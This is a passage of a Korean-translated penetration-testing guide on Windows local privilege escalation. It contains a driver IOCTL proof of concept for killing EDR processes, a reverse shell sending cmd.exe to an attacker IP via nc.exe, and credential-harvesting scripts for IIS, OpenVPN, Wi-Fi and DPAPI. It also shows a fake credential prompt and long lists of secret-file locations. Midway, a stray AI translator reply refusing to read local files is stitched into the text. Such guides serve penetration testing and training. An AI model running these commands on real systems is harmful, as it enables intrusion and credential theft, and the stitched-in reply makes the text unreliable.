**다음 페이지를 읽어 흥미로운 autoruns locations to escalate privileges에 대해 자세히 알아보세요:**


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **타사의 이상하거나 취약한** 드라이버를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

For race-condition bugs where the vulnerable call opens an attacker-controlled Object Manager path, deliberately slowing the lookup (using max-length components or deep directory chains) can stretch the window from microseconds to tens of microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities let you groom deterministic layouts, abuse writable HKLM/HKU descendants, and convert metadata corruption into kernel paged-pool overflows without a custom driver. Learn the full chain here:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- Return full-access handles to arbitrary processes (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrary processes, including Protected Process/Light (PP/PPL), allowing AV/EDR kill from user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Always set FILE_DEVICE_SECURE_OPEN when creating device objects intended to be restricted by a DACL.
- Validate caller context for privileged operations. Add PP/PPL checks before allowing process termination or handle returns.
- Constrain IOCTLs (access masks, METHOD_*, input validation) and consider brokered models instead of direct kernel privileges.

Detection ideas for defenders
- Monitor user-mode opens of suspicious device names (e.g., \\ .\\amsdk*) and specific IOCTL sequences indicative of abuse.
- Enforce Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) and maintain your own allow/deny lists.


## PATH DLL Hijacking

If you have **PATH에 포함된 폴더 안의 쓰기 권한** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **restricted services**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 비활성화, 비활성화...)**

추가[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다.

root user 권한을 얻으면 어떤 포트든 수신할 수 있습니다(포트에서 `nc.exe`를 처음 사용해 수신(listen)하면 GUI로 `nc`를 방화벽에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
루트로 bash를 쉽게 시작하려면 `--default-user root`를 시도해보세요

다음 폴더에서 `WSL` 파일시스템을 탐색할 수 있습니다: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, 이는 **Windows**가 **사용자를 자동으로 로그인할 수 있는** 경우를 의미합니다. 처음에는 사용자가 Facebook, Twitter, Gmail 등의 자격 증명을 저장해 브라우저를 통해 자동으로 로그인하는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인시킬 수 있는 자격 증명을 저장합니다. 즉, 리소스(서버나 웹사이트)에 접근하기 위해 자격 증명이 필요한 어떤 **Windows application that needs credentials to access a resource**도 이 Credential Manager 및 Windows Vault를 **can make use of this Credential Manager**하여 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있습니다.

애플리케이션이 Credential Manager와 상호작용하지 않는 한, 특정 리소스의 자격 증명을 사용하는 것은 불가능하다고 생각됩니다. 따라서 애플리케이션이 vault를 사용하려면 기본 저장 vault에서 해당 리소스에 대한 자격 증명을 요청하도록 무언가 방식으로 **communicate with the credential manager and request the credentials for that resource**해야 합니다.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`에 `/savecred` 옵션을 사용할 수 있습니다. 다음 예시는 SMB 공유를 통해 원격 바이너리를 호출하는 예입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 credential 세트를 사용하여 `runas` 실행.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** provides a method for symmetric encryption of data, predominantly used within the Windows operating system for the symmetric encryption of asymmetric private keys. This encryption leverages a user or system secret to significantly contribute to entropy.

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**. In scenarios involving system encryption, it utilizes the system's domain authentication secrets.

Encrypted user RSA keys, by using DPAPI, are stored in the `%APPDATA%\Microsoft\Protect\{SID}` directory, where `{SID}` represents the user's [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, typically consists of 64 bytes of random data. (It's important to note that access to this directory is restricted, preventing listing its contents via the `dir` command in CMD, though it can be listed through PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인수(``/pvk`` 또는 ``/rpc``)를 사용하여 **mimikatz module** `dpapi::masterkey`로 이를 복호화할 수 있습니다.

The **credentials files protected by the master password**은 보통 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred`와 적절한 `/masterkey`를 사용하여 복호화할 수 있습니다.\
`sekurlsa::dpapi` 모듈을 사용하면(루트인 경우) **extract many DPAPI** **masterkeys** from **memory** 할 수 있습니다.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 자격 증명

PowerShell 자격 증명은 스크립팅 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 수단으로 자주 사용됩니다. 해당 자격 증명은 **DPAPI**로 보호되며, 일반적으로 생성된 동일한 사용자 및 동일한 컴퓨터에서만 복호화할 수 있습니다.

파일에 포함된 PS 자격 증명을 **decrypt**하려면 다음과 같이 할 수 있습니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 와이파이
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
적절한 `/masterkey`와 함께 **Mimikatz** `dpapi::rdg` 모듈을 사용하여 모든 .rdg 파일을 **복호화**하세요.\
**Mimikatz** `sekurlsa::dpapi` 모듈로 메모리에서 **많은 DPAPI masterkeys를 추출**할 수 있습니다.

### Sticky Notes

사람들은 종종 Windows 워크스테이션에서 StickyNotes 앱을 사용하여 **비밀번호를 저장**하고 기타 정보를 보관하지만, 이것이 데이터베이스 파일이라는 사실을 모르는 경우가 많습니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 찾아보고 검사할 가치가 있습니다.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 위치합니다.\
이 파일이 존재한다면 일부 **credentials**가 구성되어 있고 **복구**될 수 있습니다.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인하세요.\
설치 프로그램은 **run with SYSTEM privileges**로 실행되며, 많은 것이 **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**에 취약합니다.
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH 키

SSH 개인 키는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 안에 저장될 수 있으므로, 거기에서 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로 안에서 항목을 찾으면 그것은 아마 저장된 SSH 키일 것입니다. 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) 를 사용하면 쉽게 복호화할 수 있습니다.\
이 기술에 대한 자세한 정보는 여기에서 확인하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

만약 `ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기술은 더 이상 유효하지 않은 것 같습니다. ssh keys를 생성하고 `ssh-add`로 추가한 뒤 ssh로 머신에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 없었고 procmon은 비대칭 키 인증 중 `dpapi.dll` 사용을 식별하지 못했습니다.
  
### 방치된 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
다음 파일들은 **metasploit**에서 검색할 수도 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

파일 **SiteList.xml**을 검색하세요

### Cached GPP Pasword

이전에는 Group Policy Preferences (GPP)를 통해 여러 대의 머신에 커스텀 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 취약점이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 도메인 내의 모든 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이러한 GPP 내의 비밀번호는 인증된(any authenticated) 사용자라면 누구나 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 할 수 있는 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 비어 있지 않은 "cpassword" 필드를 포함한 로컬에 캐시된 GPP 파일을 검색하는 함수가 개발되었습니다. 해당 파일을 찾으면 함수는 비밀번호를 복호화하고 커스텀 PowerShell 객체를 반환합니다. 이 객체에는 GPP와 파일 위치에 대한 세부 정보가 포함되어 있어 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**To decrypt the cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용해 암호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials 요청

사용자가 알 수 있을 것 같으면 언제든지 **사용자에게 자신의 credentials 또는 다른 사용자의 credentials를 입력하도록 요청할 수 있습니다** (클라이언트에게 **직접 요청**하여 **credentials**를 묻는 것은 정말 **위험합니다**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials를 포함할 수 있는 가능한 파일명**

과거에 **passwords**가 **clear-text** 또는 **Base64**로 저장되어 있던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
저는 로컬 파일 시스템에 접근할 수 없습니다. 번역할 src/windows-hardening/windows-local-privilege-escalation/README.md 파일의 내용을 여기에 붙여넣어 주시거나, 번역할 파일들을 목록으로 제공해 주세요. 제공해주시면 요청하신 규칙(코드·태그·링크·경로 미번역 등)을 준수해 정확하게 한국어로 번역해 드리겠습니다.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 Credentials

또한 Bin을 확인하여 그 안에 있는 credentials를 찾아보세요

여러 프로그램에 저장된 **recover passwords**를 찾으려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry 내부

**Other possible registry keys with credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 브라우저 기록

Chrome 또는 Firefox의 비밀번호가 저장된 dbs를 확인해야 합니다.\
브라우저의 기록, 북마크 및 즐겨찾기도 확인하세요. 그곳에 일부 **비밀번호가** 저장되어 있을 수 있습니다.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL 덮어쓰기**

**Component Object Model (COM)**은 Windows 운영 체제에 내장된 기술로, 서로 다른 언어로 작성된 소프트웨어 구성 요소 간의 **상호 통신**을 허용합니다. 각 COM 컴포넌트는 **class ID (CLSID)로 식별되며** 각 컴포넌트는 하나 이상의 인터페이스를 통해 기능을 노출하고, 해당 인터페이스는 **interface ID (IIDs)**로 식별됩니다.

COM 클래스와 인터페이스는 레지스트리의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 각각 정의됩니다. 이 레지스트리는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** 를 병합하여 생성된 **HKEY\CLASSES\ROOT** 입니다.

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

기본적으로, 실행될 DLL 중 하나를 덮어쓸 수 있다면, 그 DLL이 다른 사용자에 의해 실행될 경우 권한 상승을 할 수 있습니다.

공격자들이 COM Hijacking을 영속성(persistence) 메커니즘으로 사용하는 방법을 알아보려면 다음을 확인하세요:

{{#ref}}
com-hijacking.md
{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름을 가진 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### passwords를 검색하는 도구들

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf 플러그인입니다**. 이 플러그인은 대상 내부에서 **credentials를 검색하는 모든 metasploit POST module을 자동으로 실행**하도록 만들어졌습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에 언급된 passwords를 포함하는 모든 파일을 자동으로 검색합니다.\
